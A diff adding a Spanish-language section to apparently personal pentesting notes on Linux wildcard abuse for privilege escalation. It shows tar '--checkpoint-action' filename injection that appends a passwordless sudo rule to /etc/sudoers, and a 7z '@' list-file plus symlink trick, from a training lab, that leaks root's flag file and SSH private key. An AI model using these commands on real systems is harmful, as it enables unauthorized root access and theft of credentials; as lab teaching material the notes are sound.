@@ -584,6 +584,181 @@ Por medio de la lista de todos los paquetes instalados en el sistema es muy prob
 └──╼ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
 ```
 
+### Wildcards
+
+Los wildcard son caracteres especiales interpretados por el shell antes de ejecutar un comando y permiten representar uno o más caracteres dentro de nombres de archivos. Entre los más comunes se encuentran:
+
+- `*`: coincide con cualquier número de caracteres.
+- `?`: coincide con un solo carácter.
+- `[ ]`: coincide con un carácter dentro de un conjunto definido.
+- `~`: expande al directorio home del usuario (o al de otro usuario si se especifica).
+- `-`: dentro de `[ ]` indica un rango de caracteres.
+
+El uso inseguro de wildcard puede llevar a escalada de privilegios, especialmente en tareas automatizadas como cron jobs.
+
+#### Wildcard con tar
+
+Un ejemplo típico es `tar`, que soporta opciones como `--checkpoint` y `--checkpoint-action`. Esta última permite ejecutar una acción (incluida una ejecución tipo EXEC) cuando se alcanza un checkpoint durante la creación del archivo.
+
+Si existe un cron job que corre como un usuario privilegiado y ejecuta algo como:
+
+- `cd /home/user && tar -zcf /home/user/backup.tar.gz *`
+
+el wildcard `*` expande todos los nombres de archivos del directorio y los pasa como argumentos a `tar`.
+
+Un atacante puede crear archivos cuyos nombres sean exactamente opciones válidas de `tar` (por ejemplo, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh`). Cuando el cron job se ejecute, `tar` interpretará esos nombres como parámetros y ejecutará el comando indicado, permitiendo correr un script (`root.sh`) con privilegios elevados.
+
+Como resultado, el script puede modificar configuraciones sensibles (por ejemplo, agregando una regla a `/etc/sudoers`) y otorgar permisos sudo sin contraseña, permitiendo luego elevar privilegios a root.
+
+```
+┌─[user@user]─[/]
+└──╼ echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+
+┌─[user@user]─[/]
+└──╼echo "" > "--checkpoint-action=exec=sh root.sh"
+
+┌─[user@user]─[/]
+└──╼ echo "" > --checkpoint=1
+
+┌─[user@user]─[/]
+└──╼ ls -la
+
+total 56
+drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
+drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
+-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
+-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
+-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
+drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
+drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
+-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
+
+┌─[user@user]─[/]
+└──╼ sudo -l
+
+Matching Defaults entries for user on NIX02:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User user may run the following commands on NIX02:
+    (root) NOPASSWD: ALL
+```
+
+#### Wildcard con 7z
+ 
+Se detecta un binario con una función que comienza cambiando el directorio de trabajo a `/var/www/html`. Esto es relevante porque cualquier comando ejecutado posteriormente operará **sobre el contenido de ese directorio**, sin aplicar filtros ni validaciones adicionales. Una vez realizado el cambio de directorio, la función ejecuta un comando del sistema mediante `system()`, invocando directamente a `7za` para crear un archivo comprimido. El comando utiliza un wildcard (`*`) para incluir **todos los archivos y carpetas presentes en `/var/www/html`** dentro del backup. Debido a que la expansión del wildcard es realizada por el shell antes de que `7za` procese los argumentos, cualquier archivo existente en el directorio —incluidos aquellos creados o controlados por un usuario sin privilegios— será pasado como parámetro al comando. Esto convierte al directorio `/var/www/html` en una superficie de ataque, siempre que el usuario tenga permisos de escritura sobre él
+
+Dado que el backup incluye todos los archivos del directorio, el siguiente paso fue verificar si el usuario tiene **permisos de escritura** sobre `/var/www/html`. Al confirmarse que el directorio es escribible, se habilita la posibilidad de **abuso de wildcard**.
+
+Primero, se crea un archivo cuyo nombre comienza con `@`, ya que `7z` interpreta este tipo de archivo como una lista de entradas a procesar:
+
+```
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ls -al
+total 16
+drwxrwxrwx  4 root   xander 4096 Aug 15 07:24 .
+drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
+drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
+-rw-rw-r--  1 xander xander    0 Aug 15 07:24 @root.txt
+drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+```
+
+Al listar el contenido del directorio, se confirma que el archivo fue creado correctamente y que el usuario tiene permisos de escritura.
+
+Luego, se crea un enlace simbólico llamado `root.txt` que apunta a un archivo sensible ubicado en un directorio no accesible directamente por el usuario:
+
+```
+xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
+xander@usage:/var/www/html$ ls -al
+total 16
+drwxrwxrwx  4 root   xander 4096 Aug 15 07:25 .
+drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
+drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
+-rw-rw-r--  1 xander xander    0 Aug 15 07:24 @root.txt
+lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+```
+
+Cuando el proceso de backup es ejecutado con privilegios elevados mediante el binario vulnerable `/usr/bin/usage_management`, el comando `7z` procesa el wildcard e interpreta `@root.txt` como un archivo que contiene la lista de ficheros a comprimir.
+
+Debido a que `root.txt` es un symlink hacia `/root/root.txt`, `7z` intenta leer su contenido. Como dicho contenido no corresponde a una lista válida de archivos, el proceso genera un error que **revela el contenido del archivo objetivo** en la salida estándar.
+
+> symlink: archivo especial en sistemas Linux/Unix que apunta a otro archivo o directorio, funcionando como un acceso indirecto a ese recurso.
+
+Este comportamiento permite la **lectura arbitraria de archivos protegidos**, siempre que el atacante pueda crear archivos y enlaces simbólicos en el directorio respaldado.
+
+```
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54829972
+
+Scanning the drive:
+          
+WARNING: No more files
+c1863d1beddaa10a75c73c6eb9833c7b
+
+2984 folders, 17947 files, 113878917 bytes (109 MiB)                         
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 20931
+
+                                                                               
+Files read from disk: 17947
+Archive size: 54830114 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+c1863d1beddaa10a75c73c6eb9833c7b : No more files
+----------------
+Scan WARNINGS: 1
+```
+
+##### Extracción de id_rsa
+
+El mismo comportamiento puede explotarse para acceder a claves privadas del usuario root.
+
+Se crea nuevamente un archivo con prefijo `@`:
+
+```
+xander@usage:/var/www/html$ touch @id_rsa
+xander@usage:/var/www/html$ ls -al
+total 16
+drwxrwxrwx  4 root   xander 4096 Aug 15 07:47 .
+drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
+-rw-rw-r--  1 xander xander    0 Aug 15 07:47 @id_rsa
+drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
+lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+```
+
+Posteriormente, se crea un enlace simbólico que apunta a la clave privada SSH del usuario root:
+
+```
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$ ls -al
+total 16
+drwxrwxrwx  4 root   xander 4096 Aug 15 07:48 .
+drwxr-xr-x  3 root   root   4096 Apr  2  2024 ..
+lrwxrwxrwx  1 xander xander   17 Aug 15 07:48 id_rsa -> /root/.ssh/id_rsa
+drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
+lrwxrwxrwx  1 xander xander   14 Aug 15 07:25 root.txt -> /root/root.txt
+drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+```
+
+Al ejecutarse el backup, `7z` interpreta `@id_rsa` como un archivo de lista y termina leyendo el contenido del symlink `id_rsa`. Como el contenido no es válido para el proceso de compresión, se produce un error que expone la **clave privada SSH de root**.
+
 ## Windows
 
 ### Información del sistema
